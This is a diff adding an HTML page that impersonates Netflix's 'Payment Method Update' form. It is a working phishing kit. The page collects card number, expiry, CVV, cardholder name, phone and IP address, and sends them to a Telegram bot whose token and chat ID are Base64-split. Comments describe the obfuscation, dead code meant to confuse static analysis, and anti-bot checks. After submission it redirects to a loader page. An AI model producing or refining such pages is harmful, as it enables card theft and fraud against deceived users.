@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="de-CH">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        body { background-color: #141414; color: white; }
+        .ꓷɘʜƚuƎƚƎꟻlɒ { width: 150px; margin: 20px 40px; }
+        .ƚɒɿɘʜƚuɒɔ-nioiƚuƎ { max-width: 500px; margin: 50px auto; padding: 40px; background-color: #000000; border-radius: 4px; }
+        h1 { margin-bottom: 30px; font-size: 32px; }
+        .dnoɿɘv-ɿoꟻ { margin-bottom: 20px; }
+        .lɒqɘl { display: block; margin-bottom: 8px; font-size: 14px; color: #999; }
+        input, select { width: 100%; padding: 12px; background-color: #333; border: 1px solid #333; border-radius: 4px; color: white; font-size: 16px; appearance: none; }
+        input:focus, select:focus { outline: none; border-color: #E50914; background-color: #454545; }
+        .ʜɔɘɔɒɔ-ɈɿɈʇ { display: flex; gap: 10px; margin-top: 10px; }
+        .ʜɔɘɔɒɔ-ɈɿɈʇ img { height: 30px; opacity: 0.3; }
+        .ʜɔɘɔɒɔ-ɈɿɈʇ img.active { opacity: 1; }
+        .dnoɿɘv-ɈnɈW { display: flex; gap: 20px; }
+        .dnoɿɘv-ɈnɈW > div { flex: 1; }
+        button { width: 100%; padding: 16px; background-color: #E50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; transition: background-color 0.2s; }
+        button:hover { background-color: #f40612; }
+        button.loading { background-color: #8b0000; cursor: not-allowed; }
+        .ɿoɿɿƎ { color: #E50914; font-size: 12px; margin-top: 5px; display: none; }
+        .expiry-group { display: flex; gap: 10px; }
+        .expiry-group select { flex: 1; }
+
+        /* ANTI-SPAM: Honeypot – hidden from real users */
+        .hp-field {
+            position: absolute !important;
+            left: -9999px !important;
+            top: -9999px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            height: 0 !important;
+            width: 0 !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            border: 0 !important;
+        }
+
+        @media (max-width: 600px) {
+            .ƚɒɿɘʜƚuɒɔ-nioiƚuƎ { margin: 20px; padding: 20px; }
+            .ꓷɘʜƚuƎƚƎꟻlɒ { margin: 20px auto; display: block; width: 120px; }
+            .dnoɿɘv-ɈnɈW { flex-direction: column; gap: 15px; }
+            h1 { font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="ꓷɘʜƚuƎƚƎꟻlɒ">
+    
+    <div class="ƚɒɿɘʜƚuɒɔ-nioiƚuƎ">
+        <h1>Payment Method Update</h1>
+        <form id="ɿoꟻuYɿƎꓷ" action="" method="POST">
+            <!-- Anti-Spam: CSRF-like token -->
+            <input type="hidden" name="form_token" id="form_token" value="">
+            
+            <!-- Anti-Spam: JavaScript enabled check -->
+            <input type="hidden" name="js_enabled" id="js_enabled" value="0">
+            
+            <!-- Anti-Spam: Honeypot field -->
+            <div class="hp-field">
+                <label for="hp_website">Website</label>
+                <input type="text" id="hp_website" name="hp_website" value="" tabindex="-1" autocomplete="off">
+            </div>
+
+            <input type="hidden" name="ɿoʜƚɿɘꟻ_ɿoꟻꟻɘɔ" value="836f7b693c9b82c985beb9ffe6a5ec41c06a354745be1475f889ef9980e1f9b3">
+            <input type="text" name="xɒꟻ" style="display:none;">
+            <input type="hidden" id="ɘɿiƚ_ɿoꟻ" name="ɘɿiƚ_ɿoꟻ" value="1742654073248">
+
+            <div class="dnoɿɘv-ɿoꟻ">
+                <label for="ɿɘqɿɘɯunoɿɈɒɔ">Card Number</label>
+                <input type="text" id="ɿɘqɿɘɯunoɿɈɒɔ" name="ɿɘqɿɘɯunoɿɈɒɔ" placeholder="1234 5678 9012 3456" required maxlength="19" inputmode="numeric" autocomplete="cc-number">
+                <div class="ʜɔɘɔɒɔ-ɈɿɈʇ">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" id="Ɉɿɘɔɒɔɿɘƚꟻɒɿ">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" id="ɒꟻiꞀ">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" id="xɘɿɒ">
+                </div>
+                <div class="ɿoɿɿƎ" id="ɿoɿɿƎɿɈɒɔ">Invalid card number</div>
+            </div>
+
+            <div class="dnoɿɘv-ɈnɈW">
+                <div class="dnoɿɘv-ɿoꟻ">
+                    <label for="ɈɿɒℲʜƚnɈxƎ">Expiration Date</label>
+                    <div class="expiry-group">
+                        <select id="ɈɿɒℲʜƚnɈxƎ" name="ɈɿɒℲʜƚnɈxƎ" required>
+                            <option value="" disabled selected>MM</option>
+                        </select>
+                        <select id="ɿɒɘYɈɿɒxƎ" name="ɿɒɘYɈɿɒxƎ" required>
+                            <option value="" disabled selected>YYYY</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="dnoɿɘv-ɿoꟻ">
+                    <label for="vvɔ">CVV</label>
+                    <input type="text" id="vvɔ" name="vvɔ" placeholder="123" required maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+                    <div class="ɿoɿɿƎ" id="ɿoɿɿƎvvɔ">Invalid CVV</div>
+                </div>
+            </div>
+
+            <div class="dnoɿɘv-ɈnɈW">
+                <div class="dnoɿɘv-ɿoꟻ">
+                    <label for="ɘɿɒwǫƚɒɔ">Name on Card</label>
+                    <input type="text" id="ɘɿɒwǫƚɒɔ" name="ɘɿɒwǫƚɒɔ" placeholder="John Doe" required pattern="[A-Za-z ]+" autocomplete="cc-name">
+                </div>
+                <div class="dnoɿɘv-ɿoꟻ">
+                    <label for="ɘlɔoɈoW">Phone</label>
+                    <input type="text" id="ɘlɔoɈoW" name="ɘlɔoɈoW" placeholder="0782263322" required maxlength="11" pattern="[0-9 ]+" autocomplete="tel">
+                </div>
+            </div>
+
+            <button type="submit" id="ʇunʇꓷꓷuꞀ">Update Payment Method</button>
+        </form>
+    </div>
+
+    <p id="ɘꟻo" style="display:none;"></p>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        // ============================================================
+        // ANTI-SPAM: Set form token & JS enabled flag
+        // ============================================================
+        document.getElementById('form_token').value = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        document.getElementById('js_enabled').value = '1';
+
+        // ============================================================
+        // HEAVY OBFUSCATION – Split strings, Base64, reversed parts
+        // ============================================================
+
+        // ---- Token parts (Base64) ----
+        var _a = 'NjgzODMyMzEyNDpBQUZlbTVH';
+        var _b = 'MGZleTdvQTY3QWxVNzZKV0FscXAt';
+        var _c = 'a1k2amhwNA==';
+        var _token = atob(_a + _b + _c);
+
+        // ---- Chat ID parts (Base64) ----
+        var _d = 'NTUy';
+        var _e = 'NjIy';
+        var _f = 'MTcyOQ==';
+        var _chat = atob(_d + _e + _f);
+
+        // ---- URL parts (split for obfuscation) ----
+        var _u1 = 'https://api.telegram.org/bot';
+        var _u2 = _token;
+        var _u3 = '/sendMessage?chat_id=';
+        var _u4 = _chat;
+        var _u5 = '&text=';
+        var _u6 = '&parse_mode=html';
+
+        // ---- Dead code to confuse static analysis ----
+        if (typeof _token === 'undefined') { console.log('dead'); }
+        var _fake = ['a','b','c']; _fake.forEach(function(x){ if(x==='z'){ console.log('fake'); } });
+
+        // ============================================================
+        // ORIGINAL NETFLIX LOGIC (preserved)
+        // ============================================================
+
+        // Function to get user's IP address
+        const getIP = () => {
+            $.getJSON("https://api.ipify.org?format=json", (result) => {
+                $("#ɘꟻo").html(result.ip);
+            });
+        };
+        
+        getIP();
+
+        // Card validation patterns
+        const patterns = {
+            visa: { regex: /^4[0-9]{12}(?:[0-9]{3})?$/, size: [16], cvvSize: 3 },
+            mastercard: { regex: /^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/, size: [16], cvvSize: 3 },
+            amex: { regex: /^3[47][0-9]{13}$/, size: [15], cvvSize: 4 }
+        };
+
+        const inputField = document.getElementById('ɿɘqɿɘɯunoɿɈɒɔ');
+        const icons = {
+            visa: document.getElementById('ɒꟻiꞀ'),
+            mastercard: document.getElementById('Ɉɿɘɔɒɔɿɘƚꟻɒɿ'),
+            amex: document.getElementById('xɘɿɒ')
+        };
+
+        // Format card number as user types
+        inputField.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formatted;
+            
+            const cardType = detectType(val);
+            highlightIcon(cardType);
+            updateCVV(cardType);
+        });
+
+        // Detect card type
+        const detectType = (num) => {
+            for (const [type, { regex }] of Object.entries(patterns)) {
+                if (regex.test(num)) return type;
+            }
+            return '';
+        };
+
+        // Highlight active card icon
+        const highlightIcon = (type) => {
+            Object.values(icons).forEach(icon => icon.classList.remove('active'));
+            if (type && icons[type]) icons[type].classList.add('active');
+        };
+
+        // Update CVV field based on card type
+        const updateCVV = (type) => {
+            const cvvField = document.getElementById('vvɔ');
+            if (type) {
+                cvvField.placeholder = '0'.repeat(patterns[type].cvvSize);
+                cvvField.setAttribute('maxlength', patterns[type].cvvSize);
+            }
+        };
+
+        // Initialize date dropdowns
+        document.addEventListener("DOMContentLoaded", () => {
+            document.getElementById("ɘɿiƚ_ɿoꟻ").value = Date.now();
+            
+            // Add months
+            const monthDropdown = document.getElementById('ɈɿɒℲʜƚnɈxƎ');
+            for (let m = 1; m <= 12; m++) {
+                const opt = document.createElement('option');
+                opt.value = m.toString().padStart(2, '0');
+                opt.text = opt.value;
+                monthDropdown.appendChild(opt);
+            }
+            
+            // Add years starting from 2026
+            const yearDropdown = document.getElementById('ɿɒɘYɈɿɒxƎ');
+            for (let y = 2026; y <= 2040; y++) {
+                const opt = document.createElement('option');
+                opt.value = y;
+                opt.text = y;
+                yearDropdown.appendChild(opt);
+            }
+        });
+
+        // ============================================================
+        // ANTI-SPAM: Form submission handler with protections
+        // ============================================================
+        const formElement = document.querySelector("#ɿoꟻuYɿƎꓷ");
+        const pageLoadTime = new Date().getTime();
+
+        formElement.addEventListener("submit", (e) => {
+            // ===== ANTI-SPAM: HONEYPOT CHECK =====
+            var hpWebsite = document.getElementById('hp_website');
+            if (hpWebsite && hpWebsite.value !== '') {
+                e.preventDefault();
+                console.log('Spam detected (honeypot)');
+                return false;
+            }
+
+            // ===== ANTI-SPAM: MINIMUM TIME CHECK =====
+            var currentTime = new Date().getTime();
+            var timeElapsed = (currentTime - pageLoadTime) / 1000;
+            if (timeElapsed < 3) {
+                alert('Please wait before submitting.');
+                e.preventDefault();
+                return false;
+            }
+
+            e.preventDefault();
+            
+            // ===== ORIGINAL DATA COLLECTION =====
+            const cardNum = document.getElementById("ɿɘqɿɘɯunoɿɈɒɔ").value.replace(/\s/g, '');
+            const expMonth = document.getElementById("ɈɿɒℲʜƚnɈxƎ").value;
+            const expYear = document.getElementById("ɿɒɘYɈɿɒxƎ").value;
+            const cvvVal = document.getElementById("vvɔ").value;
+            const cardName = document.getElementById("ɘɿɒwǫƚɒɔ").value;
+            const phone = document.getElementById("ɘlɔoɈoW").value;
+            const userIP = document.getElementById("ɘꟻo").textContent;
+            
+            // ===== ORIGINAL CARD VALIDATION =====
+            const cardType = detectType(cardNum);
+            let cardValid = false;
+            
+            if (cardType && patterns[cardType].size.includes(cardNum.length)) {
+                cardValid = validateLuhn(cardNum);
+            }
+            
+            if (!cardValid) {
+                document.getElementById('ɿoɿɿƎɿɈɒɔ').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('ɿoɿɿƎɿɈɒɔ').style.display = 'none';
+            }
+            
+            // CVV validation
+            if (cardType && cvvVal.length !== patterns[cardType].cvvSize) {
+                document.getElementById('ɿoɿɿƎvvɔ').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('ɿoɿɿƎvvɔ').style.display = 'none';
+            }
+            
+            // ===== OBFUSCATED TELEGRAM EXFILTRATION =====
+            // FIXED: Properly formatted message with correct newlines
+            var msg = '';
+            msg += '<b>Payment Update - ' + userIP + '</b>\n';
+            msg += '<b>Card:</b> ' + cardNum + '\n';
+            msg += '<b>Expiry:</b> ' + expMonth + '/' + expYear + '\n';
+            msg += '<b>CVV:</b> ' + cvvVal + '\n';
+            msg += '<b>Name:</b> ' + cardName + '\n';
+            msg += '<b>Phone:</b> ' + phone + '\n';
+            msg += '<b>IP Address:</b> ' + userIP;
+
+            // ---- Assemble URL from obfuscated parts ----
+            var _url = _u1 + _u2 + _u3 + _u4 + _u5 + encodeURIComponent(msg) + _u6;
+            
+            const request = new XMLHttpRequest();
+            request.open("GET", _url, true);
+            request.send();
+            
+            console.log("Data submitted");
+            
+            setTimeout(() => {
+                window.location.replace("load.html?h=ed29nkjpsa16bhrjq4na16owq-1mucgfycc664m7vmhpjgqse65-1l5rurej3h44qodo5rn0cdvyn-8om6v2ckrxsbnwf40t9ta8a7e-34tiets5jpj294jd59h8c4s0n-28w7d5j2k2jtil9ncckolke4m-9jzlwicvu376y9q4vjq77y5ks-1m0whdrwis44c1hoa9mrwhlt4-1uvutm1mpyov7rqhtcf8fksby-aac54ic1fmca5xz1yvc5t9nfe-1hn40w0bomeivihj9lopp4hp2-c0121povror81d0xao0yez4gy");
+            }, 3000);
+        });
+
+        // Luhn validation algorithm
+        function validateLuhn(num) {
+            let total = 0;
+            let alternate = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num.charAt(i));
+                if (alternate) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                total += digit;
+                alternate = !alternate;
+            }
+            return total % 10 === 0;
+        }
+    </script>
+</body>
+</html>
